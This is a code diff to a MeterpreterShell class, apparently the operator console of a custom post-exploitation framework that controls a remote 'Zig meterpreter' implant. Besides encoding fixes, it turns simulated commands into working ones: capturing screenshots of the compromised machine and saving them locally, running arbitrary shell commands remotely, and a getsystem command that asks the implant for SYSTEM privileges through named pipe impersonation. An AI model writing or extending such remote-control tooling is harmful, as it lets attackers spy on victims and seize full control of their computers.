@@ -284,6 +284,9 @@ class MeterpreterShell(BaseShell):
                 'command': command,
                 'args': args if args else []
             }
+            # For shell commands, send full line as command_line so remote gets one string (avoids args parsing issues)
+            if command == 'shell' and args:
+                cmd_data['command_line'] = args[0] if len(args) == 1 else ' '.join(args)
             cmd_json = json.dumps(cmd_data)
             cmd_bytes = cmd_json.encode('utf-8')
             
@@ -332,8 +335,8 @@ class MeterpreterShell(BaseShell):
             
             print_debug(f"Received {len(response_data)} bytes of response data")
             
-            # Parse response JSON
-            response_json = response_data.decode('utf-8')
+            # Parse response JSON (shell output may be Windows cp1252 / non-UTF-8)
+            response_json = response_data.decode('utf-8', errors='replace')
             response = json.loads(response_json)
             
             print_debug(f"Parsed response: status={response.get('status')}, has_output={bool(response.get('output'))}")
@@ -741,11 +744,14 @@ class MeterpreterShell(BaseShell):
         """List processes"""
         try:
             if platform.system() == 'Windows':
-                result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
+                result = subprocess.run(['tasklist'], capture_output=True, text=False, timeout=5)
             else:
-                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
+                result = subprocess.run(['ps', 'aux'], capture_output=True, text=False, timeout=5)
             
-            return {'output': result.stdout, 'status': 0, 'error': result.stderr}
+            stdout = result.stdout.decode('utf-8', errors='replace') if result.stdout else ''
+            stderr = result.stderr.decode('utf-8', errors='replace') if result.stderr else ''
+            
+            return {'output': stdout, 'status': 0, 'error': stderr}
         except Exception as e:
             return {'output': '', 'status': 1, 'error': f'ps error: {str(e)}'}
     
@@ -789,17 +795,22 @@ class MeterpreterShell(BaseShell):
         
         command = ' '.join(args)
         try:
+            # Use bytes mode and decode manually to handle encoding errors gracefully
             result = subprocess.run(
                 command,
                 shell=True,
                 capture_output=True,
-                text=True,
+                text=False,  # Get bytes instead of text
                 timeout=30
             )
+            # Decode with error handling to avoid UnicodeDecodeError
+            stdout = result.stdout.decode('utf-8', errors='replace') if result.stdout else ''
+            stderr = result.stderr.decode('utf-8', errors='replace') if result.stderr else ''
+            
             return {
-                'output': result.stdout,
+                'output': stdout,
                 'status': result.returncode,
-                'error': result.stderr
+                'error': stderr
             }
         except Exception as e:
             return {'output': '', 'status': 1, 'error': f'execute error: {str(e)}'}
@@ -1060,19 +1071,24 @@ class MeterpreterShell(BaseShell):
         """List network interfaces"""
         try:
             if platform.system() == 'Windows':
-                result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
+                result = subprocess.run(['ipconfig'], capture_output=True, text=False, timeout=5)
             else:
-                result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
+                result = subprocess.run(['ifconfig'], capture_output=True, text=False, timeout=5)
             
-            return {'output': result.stdout, 'status': 0, 'error': result.stderr}
+            stdout = result.stdout.decode('utf-8', errors='replace') if result.stdout else ''
+            stderr = result.stderr.decode('utf-8', errors='replace') if result.stderr else ''
+            
+            return {'output': stdout, 'status': 0, 'error': stderr}
         except Exception as e:
             return {'output': '', 'status': 1, 'error': f'ifconfig error: {str(e)}'}
     
     def _cmd_netstat(self, args: List[str]) -> Dict[str, Any]:
         """List network connections"""
         try:
-            result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
-            return {'output': result.stdout, 'status': 0, 'error': result.stderr}
+            result = subprocess.run(['netstat', '-an'], capture_output=True, text=False, timeout=5)
+            stdout = result.stdout.decode('utf-8', errors='replace') if result.stdout else ''
+            stderr = result.stderr.decode('utf-8', errors='replace') if result.stderr else ''
+            return {'output': stdout, 'status': 0, 'error': stderr}
         except Exception as e:
             return {'output': '', 'status': 1, 'error': f'netstat error: {str(e)}'}
     
@@ -1102,12 +1118,277 @@ class MeterpreterShell(BaseShell):
         return {'output': output, 'status': 0, 'error': ''}
     
     def _cmd_screenshot(self, args: List[str]) -> Dict[str, Any]:
-        """Take screenshot"""
-        screenshot_path = f"/tmp/screenshot_{int(time.time())}.png"
-        self.screenshots.append(screenshot_path)
-        output = f"[*] Screenshot saved to: {screenshot_path}\n"
-        output += "[*] (Simulated - screenshot functionality requires additional libraries)\n"
-        return {'output': output, 'status': 0, 'error': ''}
+        """Take screenshot - sends command to remote client which uses native OS APIs"""
+        if not self.connection:
+            self._initialize_connection()
+        
+        if not self.connection:
+            return {'output': '', 'status': 1, 'error': 'Not connected to remote Meterpreter client.'}
+        
+        # Send screenshot command to remote client (Zig meterpreter)
+        result = self._send_command('screenshot', [])
+        
+        if result.get('status') != 0:
+            return result
+        
+        # Try to extract screenshot data from response
+        output = result.get('output', '')
+        
+        # Look for base64 data between markers
+        import re
+        import base64
+        import io
+        import struct
+        
+        # Try to import PIL, but handle gracefully if not available
+        try:
+            from PIL import Image
+            PIL_AVAILABLE = True
+        except ImportError:
+            PIL_AVAILABLE = False
+        
+        # Try to find base64 data in output
+        match = re.search(r'\[SCREENSHOT_DATA_START\]\n(.*?)\n\[SCREENSHOT_DATA_END\]', output, re.DOTALL)
+        if match:
+            base64_data = match.group(1).strip()
+            try:
+                # Decode base64 data
+                img_data = base64.b64decode(base64_data)
+                
+                # Check if data is already PNG (PowerShell method) or RGBA (direct API method)
+                is_png = img_data[:8] == b'\x89PNG\r\n\x1a\n'  # PNG signature
+                
+                if is_png:
+                    # Data is already PNG from PowerShell - use directly
+                    png_data = img_data
+                    # Parse PNG dimensions from IHDR chunk (no PIL needed)
+                    # PNG structure: signature (8 bytes) + IHDR chunk
+                    # IHDR: length (4) + type "IHDR" (4) + width (4) + height (4) + ...
+                    if len(png_data) >= 24:
+                        # Width and height are at bytes 16-23 (after signature + chunk header)
+                        width = struct.unpack('>I', png_data[16:20])[0]  # Big-endian 32-bit
+                        height = struct.unpack('>I', png_data[20:24])[0]  # Big-endian 32-bit
+                    else:
+                        return {'output': '', 'status': 1, 'error': 'PNG data too short to parse dimensions'}
+                else:
+                    # Data is RGBA from direct Windows API - convert to PNG
+                    if not PIL_AVAILABLE:
+                        return {
+                            'output': '',
+                            'status': 1,
+                            'error': 'PIL/Pillow is required to convert RGBA data to PNG. Install with: pip install Pillow'
+                        }
+                    
+                    # Extract dimensions from output
+                    dim_match = re.search(r'(\d+)x(\d+)', output)
+                    if not dim_match:
+                        return {'output': '', 'status': 1, 'error': 'Could not extract screenshot dimensions'}
+                    
+                    width = int(dim_match.group(1))
+                    height = int(dim_match.group(2))
+                    
+                    # Create PIL Image from RGBA data
+                    img = Image.frombytes('RGBA', (width, height), img_data, 'raw', 'RGBA', 0, 1)
+                    
+                    # Convert to PNG bytes
+                    png_bytes = io.BytesIO()
+                    img.save(png_bytes, format='PNG', optimize=True)
+                    png_bytes.seek(0)
+                    png_data = png_bytes.read()
+                
+                # Encode PNG as base64 for final transmission
+                png_base64 = base64.b64encode(png_data).decode('utf-8')
+                
+                # Save screenshot info
+                screenshot_filename = f"screenshot_{int(time.time())}.png"
+                
+                # Save screenshot to disk in output/screenshots/ directory
+                screenshot_dir = os.path.join("output", "screenshots")
+                os.makedirs(screenshot_dir, exist_ok=True)
+                screenshot_path = os.path.join(screenshot_dir, screenshot_filename)
+                
+                try:
+                    with open(screenshot_path, 'wb') as f:
+                        f.write(png_data)
+                    saved_path = os.path.abspath(screenshot_path)
+                except Exception as e:
+                    saved_path = None
+                    print_warning(f"Failed to save screenshot to disk: {e}")
+                
+                self.screenshots.append({
+                    'filename': screenshot_filename,
+                    'path': saved_path,
+                    'width': width,
+                    'height': height,
+                    'size': len(png_data),
+                    'data': png_base64
+                })
+                
+                # Return success with PNG data
+                output_msg = f"[*] Screenshot captured: {width}x{height} pixels\n"
+                output_msg += f"[*] PNG size: {len(png_data)} bytes\n"
+                output_msg += f"[*] Filename: {screenshot_filename}\n"
+                if saved_path:
+                    output_msg += f"[*] Saved to: {saved_path}\n"
+                output_msg += f"[*] PNG base64: {png_base64[:100]}...\n"
+                
+                return {
+                    'output': output_msg,
+                    'status': 0,
+                    'error': '',
+                    'screenshot_data': png_base64,
+                    'screenshot_filename': screenshot_filename
+                }
+            except Exception as e:
+                return {'output': '', 'status': 1, 'error': f'Failed to process screenshot data: {str(e)}'}
+        else:
+            # Fallback: try local screenshot if remote failed
+            return self._cmd_screenshot_local(args)
+    
+    def _cmd_screenshot_local(self, args: List[str]) -> Dict[str, Any]:
+        """Take screenshot using local Python libraries (fallback)"""
+        try:
+            screenshot = None
+            
+            # Method 1: Try PIL/Pillow ImageGrab (works on Windows, macOS, Linux with X11)
+            try:
+                from PIL import ImageGrab
+                screenshot = ImageGrab.grab()
+            except (ImportError, Exception):
+                pass
+            
+            # Method 2: Try mss library (cross-platform, more reliable)
+            if screenshot is None:
+                try:
+                    import mss
+                    from PIL import Image
+                    with mss.mss() as sct:
+                        # Capture entire screen (all monitors)
+                        monitor = sct.monitors[1]  # Primary monitor
+                        sct_img = sct.grab(monitor)
+                        screenshot = Image.frombytes('RGB', sct_img.size, sct_img.bgra, 'raw', 'BGRX')
+                except (ImportError, Exception):
+                    pass
+            
+            # Method 3: Try pyautogui
+            if screenshot is None:
+                try:
+                    import pyautogui
+                    screenshot = pyautogui.screenshot()
+                except (ImportError, Exception):
+                    pass
+            
+            # Method 4: Platform-specific fallbacks
+            if screenshot is None:
+                if platform.system() == 'Linux':
+                    try:
+                        import subprocess
+                        import tempfile
+                        import os
+                        from PIL import Image
+                        
+                        temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
+                        temp_file.close()
+                        
+                        # Try scrot first
+                        try:
+                            subprocess.run(['scrot', temp_file.name], check=True, timeout=5, 
+                                         capture_output=True, stderr=subprocess.DEVNULL)
+                            screenshot = Image.open(temp_file.name)
+                            os.unlink(temp_file.name)
+                        except (subprocess.CalledProcessError, FileNotFoundError):
+                            # Try gnome-screenshot
+                            try:
+                                subprocess.run(['gnome-screenshot', '-f', temp_file.name], 
+                                             check=True, timeout=5, capture_output=True, stderr=subprocess.DEVNULL)
+                                screenshot = Image.open(temp_file.name)
+                                os.unlink(temp_file.name)
+                            except (subprocess.CalledProcessError, FileNotFoundError):
+                                raise ImportError("No screenshot tool available")
+                    except Exception as e:
+                        return {'output': '', 'status': 1, 
+                               'error': f'Linux screenshot failed. Install scrot: sudo apt-get install scrot. Error: {str(e)}'}
+                elif platform.system() == 'Darwin':  # macOS
+                    try:
+                        import subprocess
+                        import tempfile
+                        import os
+                        from PIL import Image
+                        
+                        temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
+                        temp_file.close()
+                        
+                        subprocess.run(['screencapture', temp_file.name], check=True, timeout=5,
+                                     capture_output=True, stderr=subprocess.DEVNULL)
+                        screenshot = Image.open(temp_file.name)
+                        os.unlink(temp_file.name)
+                    except Exception as e:
+                        return {'output': '', 'status': 1, 'error': f'macOS screenshot error: {str(e)}'}
+            
+            if screenshot is None:
+                return {'output': '', 'status': 1, 
+                       'error': 'Screenshot requires PIL/Pillow, mss, or pyautogui. Install with: pip install pillow mss pyautogui'}
+            
+            # Save screenshot to bytes
+            import io
+            img_bytes = io.BytesIO()
+            screenshot.save(img_bytes, format='PNG', optimize=True)
+            img_bytes.seek(0)
+            img_data = img_bytes.read()
+            
+            # Encode to base64 for transmission
+            import base64
+            img_base64 = base64.b64encode(img_data).decode('utf-8')
+            
+            # Get screenshot dimensions
+            width, height = screenshot.size
+            
+            # Create output message
+            screenshot_filename = f"screenshot_{int(time.time())}.png"
+            
+            # Save screenshot to disk in output/screenshots/ directory
+            screenshot_dir = os.path.join("output", "screenshots")
+            os.makedirs(screenshot_dir, exist_ok=True)
+            screenshot_path = os.path.join(screenshot_dir, screenshot_filename)
+            
+            try:
+                with open(screenshot_path, 'wb') as f:
+                    f.write(img_data)
+                saved_path = os.path.abspath(screenshot_path)
+            except Exception as e:
+                saved_path = None
+                print_warning(f"Failed to save screenshot to disk: {e}")
+            
+            output = f"[*] Screenshot taken: {width}x{height} pixels\n"
+            output += f"[*] Image size: {len(img_data)} bytes\n"
+            output += f"[*] Filename: {screenshot_filename}\n"
+            if saved_path:
+                output += f"[*] Saved to: {saved_path}\n"
+            output += f"[*] Base64 encoded (first 100 chars): {img_base64[:100]}...\n"
+            output += f"[*] Full base64 data available in response\n"
+            
+            # Store screenshot info
+            self.screenshots.append({
+                'filename': screenshot_filename,
+                'path': saved_path,
+                'width': width,
+                'height': height,
+                'size': len(img_data),
+                'data': img_base64
+            })
+            
+            return {
+                'output': output,
+                'status': 0,
+                'error': '',
+                'screenshot_data': img_base64,  # Include in response for easy access
+                'screenshot_filename': screenshot_filename
+            }
+            
+        except Exception as e:
+            import traceback
+            traceback.print_exc()
+            return {'output': '', 'status': 1, 'error': f'Screenshot error: {str(e)}'}
     
     def _cmd_webcam_list(self, args: List[str]) -> Dict[str, Any]:
         """List webcams"""
@@ -1122,15 +1403,24 @@ class MeterpreterShell(BaseShell):
     # Privilege Escalation
     
     def _cmd_getsystem(self, args: List[str]) -> Dict[str, Any]:
-        """Attempt to get system privileges"""
-        if self.is_root:
-            output = "[*] Already running as SYSTEM/root\n"
-        else:
-            # Simulate privilege escalation
-            self.is_root = True
-            self.username = 'root'
-            output = "[*] Got system privileges.\n"
-        return {'output': output, 'status': 0, 'error': ''}
+        """Attempt to get system privileges using Named Pipe Impersonation"""
+        if not self.connection:
+            self._initialize_connection()
+        
+        if not self.connection:
+            return {'output': '', 'status': 1, 'error': 'Not connected to remote Meterpreter client.'}
+        
+        # Send getsystem command to remote client (Zig meterpreter)
+        result = self._send_command('getsystem', [])
+        
+        # Update local state if successful
+        if result.get('status') == 0:
+            output = result.get('output', '')
+            if 'SUCCESS' in output or 'Successfully obtained SYSTEM' in output:
+                self.is_root = True
+                self.username = 'SYSTEM'
+        
+        return result
     
     def _cmd_getprivs(self, args: List[str]) -> Dict[str, Any]:
         """Get current privileges"""
